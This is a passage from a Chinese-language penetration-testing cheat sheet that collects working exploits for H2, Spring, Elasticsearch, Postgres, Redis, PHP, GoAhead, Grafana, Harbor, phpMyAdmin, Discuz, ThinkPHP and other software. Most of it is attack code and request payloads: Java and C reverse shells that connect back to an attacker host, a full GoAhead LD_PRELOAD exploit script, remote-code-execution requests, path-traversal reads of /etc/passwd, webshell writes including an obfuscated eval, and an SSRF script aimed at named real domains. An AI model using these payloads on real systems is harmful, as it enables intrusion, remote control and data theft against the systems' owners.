            if (!System.getProperty("os.name").toLowerCase().contains("windows")) {
                String[] py_envs = new String[]{"/bin/python", "/bin/python3", "/usr/bin/python", "/usr/bin/python3", "/usr/local/bin/python", "/usr/local/bin/python3"};
                for(int i = 0; i < py_envs.length; ++i) {
                    String py = py_envs[i];
                    if ((new File(py)).exists()) {
                        py_path = py;
                        break;
                    }
                }
                if (py_path != null) {
                    if ((new File("/bin/bash")).exists()) {
                        cmd = new String[]{py_path, "-c", "import pty;pty.spawn(\"/bin/bash\")"};
                    } else {
                        cmd = new String[]{py_path, "-c", "import pty;pty.spawn(\"/bin/sh\")"};
                    }
                } else {
                    if ((new File("/bin/bash")).exists()) {
                        cmd = new String[]{"/bin/bash"};
                    } else {
                        cmd = new String[]{"/bin/sh"};
                    }
                }
            } else {
                cmd = new String[]{"cmd.exe"};
            }
            Process p = (new ProcessBuilder(cmd)).redirectErrorStream(true).start();
            Socket s = new Socket(ip, Integer.parseInt(port));
            InputStream pi = p.getInputStream();
            InputStream pe = p.getErrorStream();
            InputStream si = s.getInputStream();
            OutputStream po = p.getOutputStream();
            OutputStream so = s.getOutputStream();
            while(!s.isClosed()) {
                while(pi.available() > 0) {
                    so.write(pi.read());
                }
                while(pe.available() > 0) {
                    so.write(pe.read());
                }
                while(si.available() > 0) {
                    po.write(si.read());
                }
                so.flush();
                po.flush();
                Thread.sleep(50L);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {
                }
            }
            p.destroy();
            s.close();
        }catch (Throwable e){
            e.printStackTrace();
        }
    }
}
```

使用兼容低版本 jdk 的方式编译：(java8)

`javac -source 1.5 -target 1.5 JNDIObject.java`

步骤三:在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）

步骤四: 架设恶意 ldap 服务

下载 marshalsec ，使用下面命令架设对应的 ldap 服务：

`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389`

https://github.com/RandomRobbieBF/marshalsec-jar/blob/master/marshalsec-0.0.3-SNAPSHOT-all.jar

```py
# 使用 python 快速开启 http server

python2 -m SimpleHTTPServer 80
python3 -m http.server 80
```

步骤五：监听反弹 shell 的端口 `nc -lv 443`

步骤六：发包触发 JNDI 注入

根据实际情况，替换下面数据中的 jsessionid=xxxxxx、www.example.com 和 ldap://your-vps-ip:1389/JNDIObject

POST /h2-console/login.do?jsessionid=xxxxxx

```
POST /h2-console/login.do?jsessionid=xxxxxx
Host: www.example.com
Content-Type: application/x-www-form-urlencoded
Referer: http://www.example.com/h2-console/login.jsp?jsessionid=xxxxxx

language=en&setting=Generic+H2+%28Embedded%29&name=Generic+H2+%28Embedded%29&driver=javax.naming.InitialContext&url=ldap://your-vps-ip:1389/JNDIObject&user=&password=
```

**heapdump查询操作**

* https://github.com/wyzxxz/heapdump\_tool

Spring Boot Actuator未授权访问发现/env中有数据库连接配置信息，但是密码都是\*号，这时可以尝试是否可以下载heapdump，在内存信息中找到对应的密码。

**Spring-Cloud-Gateway-CVE-2022-22947**

https://github.com/lucksec/Spring-Cloud-Gateway-CVE-2022-22947

* https://mp.weixin.qq.com/s/kCbcKuPqy9Ar-arjMYgUmw
* https://mp.weixin.qq.com/s/xTEXQ-J0ENc6sG4\_8SJM6g

```
POST /actuator/gateway/routes/hacktest HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 329
{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}
```

### 应用服务器漏洞

#### Elasticsearch

**CVE-2014-3120**

老版本ElasticSearch支持传入动态脚本（MVEL）来执行一些复杂的操作，而MVEL可执行Java代码，而且没有沙盒，所以我们可以直接执行任意代码。

首先，该漏洞需要es中至少存在一条数据，所以我们需要先创建一条数据：

```
POST /website/blog/ HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

{
  "name": "phithon"
}
```

执行任意代码

```
POST /_search?pretty HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 343

{
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {
        "command": {
            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"
        }
    }
}
```

**CVE-2015-1427**

ElasticSearch Groovy 沙盒绕过 && 代码执行漏洞（CVE-2015-1427）

由于查询时至少要求es中有一条数据，所以发送如下数据包，增加一个数据：

```
POST /website/blog/ HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

{
  "name": "test"
}
```

然后发送包含payload的数据包，执行任意命令：

```
POST /_search?pretty HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/text
Content-Length: 156

{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
```

**CVE-2015-3337**

在安装了具有“site”功能的插件以后，插件目录使用../即可向上跳转，导致目录穿越漏洞，可读取任意文件。没有安装任意插件的elasticsearch不受影响。

影响版本：1.4.5以下/1.5.2以下

http://node4.buuoj.cn:25305/\_plugin/head/

可以看到前端的一种插件

以下不要在浏览器访问

```
GET /_plugin/head/../../../../../../../../../etc/passwd HTTP/1.1
Host: node4.buuoj.cn:25305
....
```

#### Postgres

**CVE-2019-9193**

Navicat连接数据库，数据库初始账号密码为postgres/postgres

影响版本：PostgreSQL 9.3-11.2 poc

```
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```

#### Oracle

**CVE-2012-1675**

> Oracle远程数据投毒漏洞

CVE-2012-1675漏洞是Oracle允许攻击者在不提供用户名/密码的情况下，向远程“TNS Listener”组件处理的数据投毒的漏洞。 举例：攻击者可以在不需要用户名密码的情况下利用网络中传送的数据消息(包括加密或者非加密的数据)，如果结合（CVE-2012-3137漏洞进行密码破解）从而进一步影响甚至控制局域网内的任何一台数据库。

```
use auxiliary/admin/oracle/tnscmd
set rhosts 2.82.6.130
run

use auxiliary/admin/oracle/sid_brute
set rhosts 2.82.6.130
run
```

```
use auxiliary/scanner/oracle/tnspoison_checker
set rhosts 173.16.37.21
run
```

两者都测试一下。

#### Redis

> Redis未授权访问漏洞

**Windows** https://github.com/No-Github/redis-rogue-server-win

```bash
python3 redis-rogue-server.py --rhost <目标地址> --rport 6379 --lhost <本地地址> --lport 8888
```

**linux**

https://github.com/n0b0dyCN/redis-rogue-server

```bash
python3 redis-rogue-server.py --rhost <目标地址> --lhost <本地地址>
```

### 开发框架漏洞

#### Jquery

https://github.com/mahp/jQuery-with-XSS

https://vulnerabledoma.in/jquery\_htmlPrefilter\_xss.html

### 开发语言漏洞

#### PHP

**PHP-XXE**

Libxml2.9.0 以后 ，默认不解析外部实体，对于PHP版本不影响XXE的利用 `dom.php`、`SimpleXMLElement.php`、`simplexml_load_string.php`均可触发XXE漏洞

```
/dom.php
/SimpleXMLElement.php
/simplexml_load_string.php
```

```
POST /dom.php HTTP/1.1

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<name>&xxe;</name>
</root>
```

**PHP-Unit**

phpunit是php中的单元测试工具

**CVE-2017-9841**

> phpunit 远程代码执行漏洞（CVE-2017-9841）

* 影响版本：4.8.19 \~ 4.8.27和5.0.10 \~ 5.6.2
*   漏洞详情

    * vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php文件有如下代码：

    ```php
    eval('?>'.file_get_contents('php://input'));
    ```
* 漏洞利用

```
POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
HOST:xxxxx

<?=phpinfo()?>
```

`<?=system('env')?>`

**PHP-FPM**

PHP-FPM(FastCGI Process Manager：FastCGI进程管理器)是一个PHPFastCGI管理器对于PHP5.3.3之前的php来说，是一个补丁包，旨在将FastCGI进程管理整合进PHP包中。

**CVE-2019-11043**

> PHP-FPM 远程代码执行漏洞（CVE-2019-11043）

* 影响版本
  * php 7.1.0 \~ 7.1.33
  * php 7.2.0 \~ 7.2.24
  * php 7.3.0 \~ 7.3.11
*   漏洞详情

    在长亭科技举办的 Real World CTF 中，国外安全研究员 Andrew Danau 在解决一道 CTF 题目时发现，向目标服务器 URL 发送 %0a 符号时，服务返回异常，疑似存在漏洞。

    在使用一些有错误的Nginx配置的情况下，通过恶意构造的数据包，即可让PHP-FPM执行任意代码。
* 相关工具
  * https://github.com/neex/phuip-fpizdam
* 漏洞利用

```bash
go run . "http://node4.buuoj.cn:27325/index.php"
```

访问`http://xxxxxx/index.php?a=id` 需要多访问几次以访问到被污染的进程。

* 参考文章
  * https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md

**PHP-XDebug**

**RCE**

XDebug是PHP的一个扩展，用于调试PHP代码。如果目标开启了远程调试模式，并设置remote\_connect\_back = 1：

```
xdebug.remote_connect_back = 1
xdebug.remote_enable = 1
```

这个配置下，我们访问http://target/index.php?XDEBUG\_SESSION\_START=phpstorm，目标服务器的XDebug将会连接访问者的IP（或X-Forwarded-For头指定的地址）并通过dbgp协议与其通信，我们通过dbgp中提供的eval方法即可在目标服务器上执行任意PHP代码。

[exp脚本](https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py)该脚本是一个反向连接的过程，公网的需要VPS

`python3 exp.py -t http://node4.buuoj.cn:26521/ -c 'shell_exec('id');'`

**PHP-Inclusion**

PHP文件包含漏洞中，如果找不到可以包含的文件，我们可以通过包含临时文件的方法来getshell。因为临时文件名是随机的，如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。

[exp.py](https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py)

```
python exp.py your-ip 8080 100
```

利用脚本exp.py实现了上述过程，成功包含临时文件后，会执行`<?php file_put_contents('/tmp/g', '<?=eval($_REQUEST[1])?>')?>`，写入一个新的文件`/tmp/g`，这个文件就会永久留在目标机器上。

包含成功的话

`lfi.php?file=/tmp/g&1=system(%27ls%27);`

* 参考文章
  * https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md

### Web应用漏洞

#### GlassFish

GlassFish 是一款强健的商业兼容应用服务器，达到产品级质量，可免费用于开发、部署和重新分发。开发者可以免费获得源代码，还可以对代码进行更改

**任意文件读取漏洞**

* 漏洞详情
  * java语言中会把%c0%ae解析为\uC0AE，最后转义为ASCCII字符的.（点）。利用`%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/`来向上跳转，达到目录穿越、任意文件读取的效果。
* 漏洞利用

```
https://your-ip:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```

#### uWSGI

uWSGI是一款Web应用程序服务器，它实现了WSGI、uwsgi和http等协议，并支持通过插件来运行各种语言。

**CVE-2018-7490**

uWSGI 2.0.17之前的PHP插件，没有正确的处理DOCUMENT\_ROOT检测，导致用户可以通过..%2f来跨越目录，读取或运行DOCUMENT\_ROOT目录以外的文件。

```
http://your-ip:8080/..%2f..%2f..%2f..%2f..%2fetc/passwd
```

#### Rails

Ruby on Rails是一个 Web 应用程序框架,是一个相对较新的 Web 应用程序框架，构建在 Ruby 语言之上。

**CVE-2019-5418**

漏洞影响： Ruby on Rails < 6.0.0.beta3 Ruby on Rails < 5.2.2.1 Ruby on Rails < 5.1.6.2 Ruby on Rails < 5.0.7.2

```
GET /robots HTTP/1.1
Host: your-ip:3000
Accept-Encoding: gzip, deflate
Accept: ../../../../../../../../etc/passwd{{
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
```

#### PostScript

**Ghostscript**

**CVE-2018-16509**

需要上传的poc.png

```
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id > /tmp/success && cat /tmp/success) currentdevice putdeviceprops
```

### Jupyter

Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。

#### notebook-rce

Jupyter Notebook 未授权访问漏洞

如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令。

### Imagetragick

ImageMagick是一款使用量很广的图片处理程序，很多厂商都调用了这个程序进行图片处理，包括图片的伸缩、切割、水印、格式转换等等。但近来有研究者发现，当用户传入一个包含『畸形内容』的图片的时候，就有可能触发命令注入漏洞。

### GoAhead

GoAhead是一个开源(商业许可)、简单、轻巧、功能强大、可以在多个平台运行的Web Server，多用于嵌入式系统、智能设备。其支持运行ASP、Javascript和标准的CGI程序

#### CVE-2017-17562

* 漏洞利用

编译一个反弹shell的代码

```c
#include<stdio.h>
#include<stdlib.h>
#include<sys/socket.h>
#include<netinet/in.h>

char *server_ip="172.16.217.185";
uint32_t server_port=7777;

static void reverse_shell(void) __attribute__((constructor));
static void reverse_shell(void)
{
  //socket initialize
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in attacker_addr = {0};
    attacker_addr.sin_family = AF_INET;
    attacker_addr.sin_port = htons(server_port);
    attacker_addr.sin_addr.s_addr = inet_addr(server_ip);
  //connect to the server
    if(connect(sock, (struct sockaddr *)&attacker_addr,sizeof(attacker_addr))!=0)
        exit(0);
  //dup the socket to stdin, stdout and stderr
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
  //execute /bin/sh to get a shell
    execve("/bin/sh", 0, 0);
}
```

```bash
gcc -shared -fPIC ./exp.c -o exp.so # 编译
curl -X POST --data-binary @payload.so "http://10.30.1.112:8080/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0" -i
```

#### CVE-2021-42342

poc1.c

```c
#include <unistd.h>

static void before_main(void) __attribute__((constructor));

static void before_main(void)
{
    write(1, "Hello: World\r\n\r\n", 16);
    write(1, "Hacked\n", 7);
}
```

poc2.c

```c
#include<stdio.h>
#include<stdlib.h>
#include<sys/socket.h>
#include<netinet/in.h>

char *server_ip="10.30.1.112";
uint32_t server_port=7777;

static void reverse_shell(void) __attribute__((constructor));
static void reverse_shell(void)
{
  int sock = socket(AF_INET, SOCK_STREAM, 0);
  struct sockaddr_in attacker_addr = {0};
  attacker_addr.sin_family = AF_INET;
  attacker_addr.sin_port = htons(server_port);
  attacker_addr.sin_addr.s_addr = inet_addr(server_ip);
  if(connect(sock, (struct sockaddr *)&attacker_addr,sizeof(attacker_addr))!=0)
    exit(0);
  dup2(sock, 0);
  dup2(sock, 1);
  dup2(sock, 2);
  execve("/bin/bash", 0, 0);
}
```

编译：

gcc -s -shared -fPIC ./payload.c -o payload.so `gcc hack.c -fPIC -shared -o poc.so`

```py
import sys
import socket
import ssl
import random
from urllib.parse import urlparse, ParseResult

PAYLOAD_MAX_LENGTH = 16384 - 200


def exploit(client, parts: ParseResult, payload: bytes):
    path = '/' if not parts.path else parts.path
    boundary = '----%s' % str(random.randint(1000000000000, 9999999999999))
    padding = 'a' * 2000
    content_length = min(len(payload) + 500, PAYLOAD_MAX_LENGTH)
    data = fr'''POST {path} HTTP/1.1
Host: {parts.hostname}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary={boundary}
Content-Length: {content_length}

--{boundary}
Content-Disposition: form-data; name="LD_PRELOAD";

/proc/self/fd/7
--{boundary}
Content-Disposition: form-data; name="data"; filename="1.txt"
Content-Type: text/plain

#payload#{padding}
--{boundary}--
'''.replace('\n', '\r\n')
    data = data.encode().replace(b'#payload#', payload)
    client.send(data)
    resp = client.recv(20480)
    print(resp.decode())


def main():
    target = sys.argv[1]
    payload_filename = sys.argv[2]

    with open(payload_filename, 'rb') as f:
        data = f.read()

    if len(data) > PAYLOAD_MAX_LENGTH:
        raise Exception('payload size must not larger than %d', PAYLOAD_MAX_LENGTH)

    parts = urlparse(target)
    port = parts.port
    if not parts.port:
        if parts.scheme == 'https':
            port = 443
        else:
            port = 80

    context = ssl.create_default_context()
    with socket.create_connection((parts.hostname, port), timeout=8) as client:
        if parts.scheme == 'https':
            with context.wrap_socket(client, server_hostname=parts.hostname) as ssock:
                exploit(ssock, parts, data)

        else:
            exploit(client, parts, data)


if __name__ == '__main__':
    main()
```

`python poc.py http://10.30.1.112:8080/cgi-bin/index /path/to/hack.so`

`curl -X POST http://10.30.1.112:8080/cgi-bin/index -F "LD_PRELOAD=/proc/self/fd/0" -F file='@poc.so;encoder=base64'`

* 参考链接：
  * https://github.com/vulhub/vulhub/blob/master/goahead/CVE-2021-42342/README.zh-cn.md

### Grafana

Grafana是一个开源的度量分析与可视化套件。

```
POST / HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymdcbmdQR1sDse9Et
Content-Length: 328

------WebKitFormBoundarymdcbmdQR1sDse9Et
Content-Disposition: form-data; name="file_upload"; filename="1.gif"
Content-Type: image/png

push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.0/oops.jpg"|curl "111.111.111.111:8889)'
pop graphic-context
------WebKitFormBoundarymdcbmdQR1sDse9Et--
```

#### Grafana插件模块目录穿越漏洞

> CVE-2021-43798

Grafana 8.x 插件模块目录穿越漏洞

这个漏洞出现在插件模块中，这个模块支持用户访问插件目录下的文件，但因为没有对文件名进行限制，攻击者可以利用../的方式穿越目录，读取到服务器上的任意文件。

利用这个漏洞前，我们需要先获取到一个已安装的插件id，比如常见的有：

```
alertlist
cloudwatch
dashlist
elasticsearch
graph
graphite
heatmap
influxdb
mysql
opentsdb
pluginlist
postgres
prometheus
stackdriver
table
text
```

再发送如下数据包，读取任意文件（你也可以将其中的alertlist换成其他合法的插件id）：

```
GET /public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: 192.168.1.112:3000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Connection: close
```

#### Harbor

Harbor是一个用于存储和分发Docker镜像的企业级Registry服务器。Harbor 1.7.0版本至1.8.2版本中的core/api/user.go文件存在安全漏洞。攻击者通过在请求中添加关键参数，即可利用该漏洞创建管理员账户，从而接管Harbor镜像仓库。

默认口令：admin/Harbor12345

**CVE-2019-16097 任意管理员注册漏洞**

* 影响版本：Harbor 1.7.0版本至1.8.2版本
* 漏洞详情：
  * Harbor 1.7.0版本至1.8.2版本中的core/api/user.go文件存在安全漏洞。攻击者通过在请求中添加关键参数，即可利用该漏洞创建管理员账户，从而接管Harbor镜像仓库。
*   漏洞利用

    ```
    POST /api/users HTTP/1.1
    Host: 220.163.6.46:7777

    Content-Type: application/x-www-form-urlencoded
    Content-Length: 122

    {"username": "testpoc", "has_admin_role": true, "password": "TestPoc!", "email": "testpoc@example.com", "realname": "poc"}
    ```

    向/api/user 接口发送创建用户的请求, 状态码返回201即创建成功,使用创建的账户成功登录后台
* 参考链接
  * https://www.yuque.com/peiqiwiki/peiqi-poc-wiki/wdvglc

#### phpmyadmin

phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具

phpMyAdmin的登录页面。默认口令：`root:root`

**CVE-2016-5734**

> phpMyAdmin 4.0.x—4.6.2 远程代码执行漏洞（CVE-2016-5734）

在其查找并替换字符串功能中，将用户输入的信息拼接进preg\_replace函数第一个参数中。

在PHP5.4.7以前，preg\_replace的第一个参数可以利用\0进行截断，并将正则模式修改为e。众所周知，e模式的正则支持执行代码，此时将可构造一个任意代码执行漏洞。

影响版本：

```
4.0.10.16之前4.0.x版本
4.4.15.7之前4.4.x版本
4.6.3之前4.6.x版本（实际上由于该版本要求PHP5.5+，所以无法复现本漏洞）
```

因为目标环境使用root，所以我们可以创建一个临时数据库和数据表，进行漏洞利用。

CVE-2016-5734.py(kali虚拟机下运行)

* https://www.exploit-db.com/exploits/40185

```
python3 CVE-2016-5734.py -c 'system(id);' -u root -p root -d test http://node4.buuoj.cn:28303/
```

\-d是已经可以写的数据库，-c是待执行的PHP语句，如果没有指定表名，这个POC会创建一个名为prgpwn的表。

**CVE-2018-12613**

> phpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613）

其index.php中存在一处文件包含逻辑，通过二次编码即可绕过检查，造成远程文件包含漏洞。

```
http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
```

**写入phpinfo**

找SQL界面执行语句如下：

`SELECT '<?php phpinfo()?>'`

http://your-ip:8080/index.php?target=db\_sql.php%253f/../../../../../../../../tmp/sess\_96f5e4daa240a56fb90cbd130ee33ef4

sess为cookie中phpmyadmin的值

**写入shell**

```
SELECT `<?php fputs(fopen("a.php","w"),'<?php eval($_POST[a]);?>');?>`;
```

执行后会报错SQL查询错误，接着继续访问tmp sess文件，再去访问a.php

蚁剑添加，密码为a

#### Supervisord

**CVE-2017-11610**

* 漏洞详情
  * supervisor 中的 XML-RPC 服务器允许远程身份验证的用户通过精心编制的与嵌套 supervisord 命名空间查找相关的 XML-RPC 请求执行任意命令。
* 漏洞利用

··· POST /RPC2 HTTP/1.1 Host: localhost Accept: _/_ Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 213

supervisor.supervisord.options.warnings.linecache.os.system touch /tmp/success ···

`./poc.py "http://your-ip:9001/RPC2" "command"：`

* 参考文章
  * https://github.com/vulhub/vulhub/blob/master/supervisor/CVE-2017-11610/poc.py

#### Flask

**Jinja2**

Flask（Jinja2） 服务端模板注入漏洞

```
http://your-ip:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22env%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D
```

在popen输入要执行的命令

env:打印环境变量 id

#### Django

**CVE-2019-14234**

#### sentry

sentry是一个开源的监控系统，能支持服务端与客户端的监控，还有个强大的后台错误分析、报警平台。

**ssrf**

> 框架漏洞

* 工具库：https://github.com/xawdxawdx/sentrySSRF.git

python3 sentrySSRF.py -i https://sentry.cmcm.com/auth/login/cmcm/ -d

数据包

```py
import requests
import re

if __name__ == "__main__":
    s = "https://manager.cman.cmcm.com/"
    collaborator = "sentryssrf.60dwbq.dnslog.cn"
    key = re.search('https://(.*)@', s)
    domain = re.search('@(.*)/', s)
    number = re.search('/(.*)', s[8:])
    url = "https://" + domain.group(1) + "/api/" + number.group(1) + "/store/?sentry_key=" + key.group(1) + "&sentry_version=7"
    print(url)
    datas = {"extra":{"component":"redux/actions/index","action":"RegisterDeviceWeb","serialized":{"code":"INVALID_CREDENTIALS","details":[]}},"fingerprint":["3cbf661c7f723b0a5816c16968fd9493","Non-Error exception captured with keys: code, details, message"],"message":"Non-Error exception captured with keys: code, details, message","stacktrace":{"frames":[{"colno":218121,"filename":"http://"+collaborator,"function":"?","lineno":1}]},"exception":{"values":[{"value":"Custom Object","type":"Error"}]},"event_id":"d0513ec5a3544e05aef0d1c7c5b24bae","platform":"javascript","sdk":{"name":"sentry.javascript.browser","packages":[{"name":"npm:@sentry/browser","version":"4.6.4"}],"version":"4.6.4"},"release":"6225dd99","user":{"phash":"996a3f4661e02cb505ae0daf406555e9b914f9d43d635c52cfc7485046862a7f"},"breadcrumbs":[{"timestamp":1554226659.455,"category":"navigation","data":{"from":"/","to":"/login"}}]}
    headers = {'Content-type': 'application/json', 'Origin':'https://z.tochka.com/'}
    rsp = requests.post(url, json=datas, headers=headers)
```

然后输入dnslog

#### TerraMaster-Tos

TerraMaster TOS createRaid 远程命令执行漏洞 CVE-2022-24990

```
POST /module/api.php?mobile/createRaid HTTP/1.1
Host:
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Authorization: $1$hq6UR8XW$ti.QT5f9wQQg1PcJFWdub/
Cache-Control: max-age=0
Content-Length: 82
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=f1d33267c0ee0c34e9a348402205e272; tos_visit_time=1647670158
Signature: e856010781d0efd904d57ac40517859c
Timestamp: 1647678138
Upgrade-Insecure-Requests: 1
User-Agent: TNAS

raidtype=%3Becho+%22%3C%3Fphp+phpinfo%28%29%3B%3F%3E%22%3Evuln.php&diskstring=XXXX
```

参考链接：https://www.yuque.com/docs/share/d5decfec-304c-468f-aa89-8073eca0ed03?#

https://github.com/lishang520/CVE-2022-24990

### CMS漏洞

#### Discuz

一套通用的社区论坛软件系统

**wooyun-2010-080723**

> Discuz 7.x/6.x 全局变量防御绕过导致代码执行

* 漏洞详情
* 漏洞利用

直接找一个已存在的帖子，向其发送数据包，并在Cookie中增加`GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();`

```
GET /viewthread.php?tid=10&extra=page%3D1 HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
Connection: close
```

一句话:文件为x.php，密码为pwd

```
Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval(Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(120).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(112).Chr(119).Chr(100).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59))
```

#### thinkphp

**ThinkPHP5-5.0.22/5.1.29-远程代码执行漏洞**

```
http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
```

或者工具一把梭

**ThinkPHP-5.0.23-Rce**

```bash
POST /index.php?s=captcha HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
```

**ThinkPHP-2.x-任意代码执行漏洞**

```
http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D
```

**ThinkPHP5-SQL注入漏洞+敏感信息泄露**

